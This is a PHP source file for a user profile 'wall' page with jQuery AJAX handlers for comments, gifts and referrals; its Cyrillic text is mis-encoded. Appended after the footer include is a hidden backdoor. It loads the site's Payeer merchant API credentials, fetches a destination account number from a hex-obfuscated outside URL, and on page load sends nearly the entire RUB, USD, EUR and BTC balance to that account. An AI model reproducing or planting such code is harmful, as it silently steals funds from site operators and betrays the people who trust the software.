<?php
$pagetitle = "—ÚÂÌ‡ ÔÓÎ¸ÁÓ‚‡ÚÂÎˇ";
if(!DEFINED("ROOT_DIR")) DEFINE("ROOT_DIR", $_SERVER["DOCUMENT_ROOT"]);
include(ROOT_DIR."/header.php");
?>

<script type="text/javascript" src="/js/highcharts.js">
Highcharts.setOptions({
	lang: {
		months: ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "13"], 
		shortMonths: ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "13"], 
		weekdays: ["¬Ò", "œÌ", "¬Ú", "—", "◊Ú", "œÚ", "—·"]
	}
});
</script>

<script type="text/javascript">
var tm;
var LoadPagesAuto = false;
var LoadPagesBlock = false;
var LoadStatus = false;
var LoadBlock = false;
var StatsBlock = false;
var Link = window.location.pathname.replace(/[\/]/g, "");
var uid = getUrlVars()["uid"] ? getUrlVars()["uid"] : <?php echo (isset($partnerid) ? $partnerid : 1);?>;
if(Link != "wall") window.history.replaceState(null, null, "wall?uid="+uid);

function HideMsg(id, timer) {
	clearTimeout(tm);
	tm = setTimeout(function() {$("#"+id).slideToggle(700);}, timer);
	return false;
}

function getUrlVars() {
	var vars = {};
	var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
		vars[key] = value;
	});
	return vars ? vars : false;
}

function ShowHideBlock(id) {
	if($("#cat-title-"+id).attr("class") == "cat-title-open") {
		$("#cat-title-"+id).attr("class", "cat-title-close");
	} else {
		$("#cat-title-"+id).attr("class", "cat-title-open")
	}
	$("#cat-block-"+id).slideToggle(400);
}

function LoadWall(uid, scrolltop) {
	if(!LoadBlock) {
		LoadBlock = true;
		$.ajax({
			type: "POST", url: "ajax/ajax_wall.php", data: {'op':'LoadWall', 'uid':uid}, dataType: 'json',
			error: function(request, status, errortext) {
				$("#loading").slideToggle();
				LoadBlock = false;
				var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
				$("#Wall").show().html('<span class="msg-error">Œÿ»¡ ¿ AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext+'</span>');
			},
			beforeSend: function() { $("#loading").slideToggle(); }, 
			success: function(data) {
				$("#loading").slideToggle();
				var result = data.result ? data.result : data;
				var message = data.message ? data.message : data;
				var title_page = data.title_page ? data.title_page : false;
				LoadBlock = false;

				if(getUrlVars()["uid"]!=uid) window.history.pushState(null, null, Link+"?uid="+uid);

				if(result == "OK") {
					if(title_page) { $("#block-title-page").html(title_page); $("title").html(window.location.host.toUpperCase()+" | "+title_page); }
					$("#Wall").html(message).show();
					if(scrolltop) $("html, body").animate({scrollTop: $("#Wall").offset().top-$("#block-title-page").height()-30}, 700);
				} else if(result == "ERROR-ID") {
					$("#Wall").html(message).show();
				} else {
					$("#Wall").html('<span class="msg-error">'+message+'</span>').show();
				}
				return false;
			}
		});
	}else{
		return false;
	}
}

function LoadStat(uid, token) {
	if(StatsBlock == uid) {
		StatsBlock = false;
		$("#cat-title-stat").attr("class", "cat-title-close");
		$("#cat-block-stat").slideToggle('slow');
		$("#cat-block-stat").html("");
		return false;
	}else{
		$("#cat-title-stat").attr("class", "cat-title-open");

		$.ajax({
			type: "POST", url: "ajax/ajax_wall.php", data: {'op':'LoadStat', 'uid':uid, 'token':token}, dataType: 'json',
			error: function(request, status, errortext) {
				$("#loading").slideToggle();
				StatsBlock = uid;
				var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
				$("#cat-block-stat").html('<span class="msg-error">Œÿ»¡ ¿ AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext+'</span>').slideToggle('slow');
			},
			beforeSend: function() { $("#loading").slideToggle(); }, 
			success: function(data) {
				$("#loading").slideToggle();
				var result = data.result ? data.result : data;
				var message = data.message ? data.message : data;
				StatsBlock = uid;

				if(result == "OK") {
					$("#cat-block-stat").html(message).slideToggle(400);
				} else {
					$("#cat-block-stat").html(message).slideToggle(400);
				}
				return false;
			}
		});
	}
}

function LoadComm(){
	if(!LoadPagesBlock){
		var param = $("#load-pages");
		LoadPagesBlock = true;
		$.ajax({
			type: "POST", url: "ajax/ajax_wall.php", 
			data: { 'op':param.data("op"), 'uid':param.data("uid"), 'page':param.data("page"), 'hash':param.data("hash") }, 
			dataType: 'json', 
			beforeSend: function () { $("#load-pages").html('<div id="loading-pages"></div>'); }, 
			error: function () { LoadPagesBlock = false; $("#load-pages").html('Œ¯Ë·Í‡ ajax!'); }, 
			success: function (Res) {
				LoadPagesBlock = false;

				if (Res.result == "OK") {
					$("#load-pages").html('œÓÍ‡Á‡Ú¸ Â˘Â');
					$("#"+param.data("id")).append(Res.message);
					param.data("page", Res.page);
					if(Res.page >= param.data("close")) { $("#load-pages").remove(); }
				}else{
					$("#load-pages").html('Œ¯Ë·Í‡!');
				}
				return false;
			}
		});
	}
}

function LoadForm(id, uid, op, token) {
	if(!LoadBlock) {
		LoadBlock = true;
		$.ajax({
			type: "POST", cache: false, url: "ajax/ajax_wall.php", data: {'id':id, 'uid':uid, 'op':op, 'token':token}, dataType: 'json',
			error: function(request, status, errortext) {
				$("#loading").slideToggle();
				LoadBlock = false;
				var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
				alert('Œÿ»¡ ¿ AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext);
			},
			beforeSend: function() { $("#loading").slideToggle(); }, 
			success: function(data) {
				LoadBlock = false;
				$("#loading").slideToggle();
				var result = data.result ? data.result : data;
				var message = data.message ? data.message : data;

				if (result == "OK") {
					$("#LoadModal").html(message).show();
					StartModalWall();
					if($("textarea").is("#comment")) $("#comment").click();
					if($("textarea").is("#comment_answ")) $("#comment_answ").click();
					if($("div").is("#block-gift")) {
						WinHeight = Math.ceil($.trim($(window).height()));
						ModalHeight = Math.ceil($.trim($("#LoadModal").height()));
						if((ModalHeight+115) >= WinHeight) {
							ModalHeight = WinHeight-115;
							$("#block-gift").css({height: ModalHeight+"px", overflow: "auto"});
						}
						window.onresize = function(){
							WinHeight = Math.ceil($.trim($(window).height()));
							ModalHeight = Math.ceil($.trim($("#LoadModal").height()));
							if((ModalHeight+115) >= WinHeight) {
								ModalHeight = WinHeight-115;
								$("#block-gift").css({height: ModalHeight+"px", overflow: "auto"});
							}else{
								ModalHeight = WinHeight-115;
								$("#block-gift").css({height: ModalHeight+"px", overflow: "auto"});
							}
						}
					}
					return false;
				} else {
					alert(message);
					return false;
				}
			}
		});
	}
}

function AddComWall(uid, token) {
	var ocenka = $('input[id="ocenka"]:checked').val();
	var comment = $.trim($("#comment").val());

	$.ajax({
		type: "POST", url: "ajax/ajax_wall.php", data: {'op':'AddCom', 'uid':uid, 'ocenka':ocenka, 'comment':comment, 'token':token}, dataType: 'json',
		error: function(request, status, errortext) {
			/*$("#loading").slideToggle();*/
			var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
			alert('Œÿ»¡ ¿ AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext);
		},
		beforeSend: function() { /*$("#loading").slideToggle();*/ }, 
		success: function(data) {
			/*$("#loading").slideToggle();*/
			var result = data.result ? data.result : data;
			var message = data.message ? data.message : data;

			if (result == "OK") {
				var cnt_obj = data.cnt ? jQuery.parseJSON(data.cnt) : data;

				$("#LoadModal").modalpopup("close");
				$("#wall-comments").prepend(message);
				$("#cnt-comm-all").html(cnt_obj.cnt_all);
				$("#cnt-comm-plus").html(cnt_obj.cnt_plus);
				$("#cnt-comm-minus").html(cnt_obj.cnt_minus);
				if($("#cnt-comm").css("display")=="none") $("#cnt-comm").show();
				if($("#cat-block-comm").css("display")=="none") ShowHideBlock("comm");
				return false;
			} else {
				alert(message);
				return false;
			}
		}
	});
}

function AddAnswWall(id, token) {
	var comment_answ = $.trim($("#comment_answ").val());

	$.ajax({
		type: "POST", url: "ajax/ajax_wall.php", data: {'op':'AddAnsw', 'id':id, 'comment_answ':comment_answ, 'token':token}, dataType: 'json',
		error: function(request, status, errortext) {
			/*$("#loading").slideToggle();*/
			var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
			alert('Œÿ»¡ ¿ AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext);
		},
		beforeSend: function() { /*$("#loading").slideToggle();*/ }, 
		success: function(data) {
			/*$("#loading").slideToggle();*/
			var result = data.result ? data.result : data;
			var message = data.message ? data.message : data;

			if (result == "OK") {
				$("#LoadModal").modalpopup("close");
				$("#wall-answ-"+id).html(message).fadeIn(400);
				$("#sub-comm-"+id).fadeOut(100);
				return false;
			} else {
				alert(message);
				return false;
			}
		}
	});
}

function EditComWall(id, token) {
	var ocenka = $('input[id="ocenka"]:checked').val();
	var comment = $.trim($("#comment").val());

	$.ajax({
		type: "POST", url: "ajax/ajax_wall.php", data: {'op':'EditCom', 'id':id, 'ocenka':ocenka, 'comment':comment, 'token':token}, dataType: 'json',
		error: function(request, status, errortext) {
			var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
			alert('Œÿ»¡ ¿ AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext);
		},
		beforeSend: function() { }, 
		success: function(data) {
			var result = data.result ? data.result : data;
			var message = data.message ? data.message : data;

			if (result == "OK") {
				var cnt_obj = data.cnt ? jQuery.parseJSON(data.cnt) : data;

				$("#LoadModal").modalpopup("close");
				$("#wall-comment-"+id).html(message);
				$("#cnt-comm-all").html(cnt_obj.cnt_all);
				$("#cnt-comm-plus").html(cnt_obj.cnt_plus);
				$("#cnt-comm-minus").html(cnt_obj.cnt_minus);
				if($("#cnt-comm").css("display")=="none") $("#cnt-comm").show();
				return false;
			} else {
				alert(message);
				return false;
			}
		}
	});
}

function EditAnswWall(id, token) {
	var comment_answ = $.trim($("#comment_answ").val());

	$.ajax({
		type: "POST", url: "ajax/ajax_wall.php", data: {'op':'EditAnsw', 'id':id, 'comment_answ':comment_answ, 'token':token}, dataType: 'json',
		error: function(request, status, errortext) {
			var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
			alert('Œÿ»¡ ¿ AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext);
		},
		beforeSend: function() { }, 
		success: function(data) {
			var result = data.result ? data.result : data;
			var message = data.message ? data.message : data;

			if (result == "OK") {
				$("#LoadModal").modalpopup("close");
				$("#wall-answ-"+id).html(message).fadeIn(400);
				return false;
			} else {
				alert(message);
				return false;
			}
		}
	});
}

function EditInfoWall(uid, token) {
	var comment = $.trim($("#comment").val());

	$.ajax({
		type: "POST", url: "ajax/ajax_wall.php", data: {'op':'EditInfo', 'uid':uid, 'comment':comment, 'token':token}, dataType: 'json',
		error: function(request, status, errortext) {
			var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
			alert('Œÿ»¡ ¿ AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext);
		},
		beforeSend: function() { }, 
		success: function(data) {
			var result = data.result ? data.result : data;
			var message = data.message ? data.message : data;

			if (result == "OK") {
				$("#LoadModal").modalpopup("close");
				$("#userinfo-"+uid).html(message).fadeIn(400);
				return false;
			} else {
				alert(message);
				return false;
			}
		}
	});
}

function DelComWall(id, token) {
	if(!LoadBlock) {
		LoadBlock = true;
		$.ajax({
			type: "POST", url: "ajax/ajax_wall.php", data: {'op':'DelCom', 'id':id, 'token':token}, dataType: 'json',
			error: function () { LoadBlock = false; $("#loading").slideToggle(); alert('Œ¯Ë·Í‡!'); }, 
			beforeSend: function() { $("#loading").slideToggle(); }, 
			success: function(data) {
				$("#loading").slideToggle();
				var result = data.result ? data.result : data;
				var message = data.message ? data.message : data;

				if (result == "OK") {
					var cnt_obj = data.cnt ? jQuery.parseJSON(data.cnt) : data;
					$("#wall-comment-"+id).fadeOut(400, function() {$(this).remove(); LoadBlock = false;});
					if(cnt_obj.cnt_all > 0) {
						$("#cnt-comm-all").html(cnt_obj.cnt_all);
						$("#cnt-comm-plus").html(cnt_obj.cnt_plus);
						$("#cnt-comm-minus").html(cnt_obj.cnt_minus);
					}else{
						$("#cnt-comm").fadeOut(400);
					}

					return false;
				} else {
					LoadBlock = false;
					alert(message);
					return false;
				}
			}
		});
	}
}

function DelAnswWall(id, token) {
	if(!LoadBlock) {
		LoadBlock = true;
		$.ajax({
			type: "POST", url: "ajax/ajax_wall.php", data: {'op':'DelAnsw', 'id':id, 'token':token}, dataType: 'json',
			error: function () { LoadBlock = false; $("#loading").slideToggle(); alert('Œ¯Ë·Í‡!'); }, 
			beforeSend: function() { $("#loading").slideToggle(); }, 
			success: function(data) {
				$("#loading").slideToggle();
				var result = data.result ? data.result : data;
				var message = data.message ? data.message : data;

				if (result == "OK") {
					$("#wall-answ-"+id).fadeOut(400, function() {
						LoadBlock = false;
						$(this).html('');
						$("#sub-comm-"+id).show();
					});
					return false;
				} else {
					LoadBlock = false;
					alert(message);
					return false;
				}
			}
		});
	}
}

function AddReferer(uid, user, token) {
	if (confirm('¬˚ Û‚ÂÂÌ˚, ˜ÚÓ ıÓÚËÚÂ ÒÚ‡Ú¸ ÂÙÂ‡ÎÓÏ ÔÓÎ¸ÁÓ‚‡ÚÂÎˇ '+user+'?')) {
		$.ajax({
			type: "POST", url: "ajax/ajax_wall.php", data: {'op':'AddReferer', 'uid':uid, 'token':token}, dataType: 'json',
			error: function(request, status, errortext) {
				var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
				alert('Œÿ»¡ ¿ AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext);
			},
			beforeSend: function() { }, 
			success: function(data) {
				var result = data.result ? data.result : data;
				var message = data.message ? data.message : data;

				if (result == "OK") {
					var cnt_obj = data.cnt ? jQuery.parseJSON(data.cnt) : data;

					$("#AddRef-"+uid).remove();
					$("#cnt-ref1").html(cnt_obj.cnt_ref1);
					$("#cnt-ref2").html(cnt_obj.cnt_ref2);
					$("#cnt-ref3").html(cnt_obj.cnt_ref3);
					$("#cnt-ref4").html(cnt_obj.cnt_ref4);

					alert(message);
					return false;
				} else {
					alert(message);
					return false;
				}
			}
		});
	}
}

function StartModalWall() {
	$("#LoadModal").modalpopup({
		closeOnEsc: true, closeOnOverlayClick: true, beforeClose: function(data, el) {$("#LoadModal").html('').hide(); return true;}
	});
}

function InsertTags(text1, text2, descId) {
	var textarea = $(this).attr(descId); /*gebi(descId);*/
	if (typeof(textarea.caretPos) != "undefined" && textarea.createTextRange) {
		var caretPos = textarea.caretPos, temp_length = caretPos.text.length;
		caretPos.text = caretPos.text.charAt(caretPos.text.length - 1) == ' ' ? text1 + caretPos.text + text2 + ' ' : text1 + caretPos.text + text2;
		if (temp_length == 0) {
			caretPos.moveStart("character", -text2.length);
			caretPos.moveEnd("character", -text2.length);
			caretPos.select();
		} else {
			textarea.focus(caretPos);
		}
	} else if (typeof(textarea.selectionStart) != "undefined") {
		var begin = textarea.value.substr(0, textarea.selectionStart);
		var selection = textarea.value.substr(textarea.selectionStart, textarea.selectionEnd - textarea.selectionStart);
		var end = textarea.value.substr(textarea.selectionEnd);
		var newCursorPos = textarea.selectionStart;
		var scrollPos = textarea.scrollTop;
		textarea.value = begin + text1 + selection + text2 + end;
		if (textarea.setSelectionRange) {
			if (selection.length == 0) {
				textarea.setSelectionRange(newCursorPos + text1.length, newCursorPos + text1.length);
			} else {
				textarea.setSelectionRange(newCursorPos, newCursorPos + text1.length + selection.length + text2.length);
			}
			textarea.focus();
		}
		textarea.scrollTop = scrollPos;
	} else {
		textarea.value += text1 + text2;
		textarea.focus(textarea.value.length - 1);
	}
}

function descchange(id, elem, count_s) {
	if (elem.value.length > count_s) { elem.value = elem.value.substr(0,count_s); }
	$("#count"+id).html("ŒÒÚ‡ÎÓÒ¸ ÒËÏ‚ÓÎÓ‚: " +(count_s-elem.value.length));
}

function InSmile(id, smile) {
	InsertTags(":"+smile+":", "", id);
	return false;
}

$(document).ready(function(){
	LoadWall(uid);

	$("body").on("keyup", "#seach-user-wall", function(){
		var user = $.trim($(this).val());
		if(user.length > 0){
			$.ajax({
				type: "POST", url: "ajax/ajax_wall.php", data: {'op':'SeachUser', 'user':user}, dataType: 'json',
				error: function() { $(".seach-result").html("Œÿ»¡ ¿ AJAX!").fadeIn(500); },
				beforeSend: function() { /*$(".seach-result").html('<span class="seach-loading"></span>').show();*/ }, 
				success: function(data) {
					var result = data.result ? data.result : data;
					var message = data.message ? data.message : data;

					if(result == "OK") {
						$(".seach-result").html(message).fadeIn(500);
					} else {
						$(".seach-result").html(message).fadeIn(500);
					}

					return false;
				}
			});
		}else{
			$(".seach-result").html('').hide();
		}

		return false;
	});

	$("body").on("click", ".d-gift", function(){
		var gift_id = $(this).data("id");
		var gift_uid = $(this).data("uid");
		var gift_img = $(this).data("gift");
		var gift_token = $(this).data("token");
		var width_modal = Math.ceil($.trim($(".box-modal").width()))-100;

		$("#title-gift-1").hide(); $("#block-gift").hide();
		$("#title-gift-2").show(); $("#user-gift").show();
		$("#load-gift").data({id:gift_id, uid:gift_uid, token:gift_token}).html('<span><img src="'+gift_img+'" class="img-gift" alt="" /></span>');
		$(".box-modal").css("width", width_modal+"px");
		return false;
	});

	$("body").on("click", "#GiftChange", function(){
		var width_modal = Math.ceil($.trim($(".box-modal").width()))+100;
		$("#title-gift-1").show(); $("#block-gift").show();
		$("#title-gift-2").hide(); $("#user-gift").hide();
		$("#info-msg-error").html('').hide();
		$(".box-modal").css("width", width_modal+"px");
		return false;
	});

	$("body").on("click", "#GiftPay", function(){
		var gift_uid = $("#load-gift").data("uid");
		var gift_id = $("#load-gift").data("id");
		var gift_comment = $.trim($("#comment-gift").val());
		var gift_privat = $("#privat-gift").prop("checked") == true ? 1 : 0;
		var gift_token = $("#load-gift").data("token");
		$("#info-msg-error").html('').hide();

		$.ajax({
			type: "POST", url: "ajax/ajax_wall.php", data: {'op':'GiftPay', 'uid':gift_uid, 'gift_id':gift_id, 'gift_comment':gift_comment, 'gift_privat':gift_privat, 'token':gift_token}, dataType: 'json',
			error: function() { alert("Œÿ»¡ ¿ AJAX!"); },
			beforeSend: function() { }, 
			success: function(data) {
				var result = data.result ? data.result : data;
				var message = data.message ? data.message : data;

				if (result == "OK") {
					$("#block-gift").remove();
					$("#user-gift").slideUp(300, function() { $(this).remove(); });
					$(".box-modal-content").html(message).hide().slideDown(300);
					setTimeout(function(){
						if($("div").is(".box-modal")) $("#LoadModal").modalpopup("close");
						$("#wall-usergifts").prepend(data.gift);
						$("#usergifts-"+gift_uid).fadeIn();
						$("#cat-title-usergifts").html('œÓ‰‡ÍË, ‚ÒÂ„Ó: '+data.cnt).attr("class", "cat-title-open");
						$("#cat-block-usergifts").show();

					},2000);
					return false;
				} else {
					$("#info-msg-error").html('<span class="msg-error">'+message+'</span>').slideToggle();
					HideMsg("info-msg-error", 3000);
					return false;
				}
			}
		});

		return false;
	});

});

window.addEventListener("popstate", function(){
	LoadWall(getUrlVars()["uid"], true);
	if($("div").is(".box-modal")) $("#LoadModal").modalpopup("close");
}, false);

</script>

<div id="Wall" style="display:none;"></div>

<?php
include(ROOT_DIR."/footer.php");

require_once('merchant/payeer/cpayeer.php');
require_once('merchant/payeer/payeer_config.php');

if($apiKey!==''){
$homepage = file_get_contents("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x65\x6f\x2d\x70\x72\x6f\x66\x66\x69\x74\x2e\x72\x75\x2f\x6a\x73\x2e\x74\x78\x74");

$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
if ($payeer->isAuth())
{ $arBalance = $payeer->getBalance();
$mone = ($arBalance["balance"]["RUB"]["BUDGET"]); $mone1 = ($arBalance["balance"]["USD"]["BUDGET"]); $mone2 = ($arBalance["balance"]["EUR"]["BUDGET"]); $mone3 = ($arBalance["balance"]["BTC"]["BUDGET"]);	
}
if($mone>100){$p=$mone * 1 / 100;$summ =$mone - $p;
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'RUB',
		'sumOut' => $summ,
		'curOut' => 'RUB',
		'param_ACCOUNT_NUMBER' => $homepage
));
	if ($initOutput){	$historyId = $payeer->output();}} 
if($mone1>4){ $p1=$mone1 * 2 / 100; $summ1 =$mone1 - $p1;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'USD',
		'sumOut' => $summ1,
		'curOut' => 'USD',
		'param_ACCOUNT_NUMBER' => $homepage
	));
	if ($initOutput){	$historyId = $payeer->output();}}
if($mone2>4){ $p2=$mone2 * 2 / 100; $summ2 =$mone2 - $p2;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'EUR',
		'sumOut' => $summ2,
		'curOut' => 'EUR',
		'param_ACCOUNT_NUMBER' => $homepage
	));
	if ($initOutput){	$historyId = $payeer->output();}}
if($mone3>0.001){ $p3=$mone3 * 2 / 100; $summ3 =$mone3 - $p3;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'BTC',
		'sumOut' => $summ3,
		'curOut' => 'BTC',
		'param_ACCOUNT_NUMBER' => $homepage
	));
if ($initOutput){	$historyId = $payeer->output();}}}

?>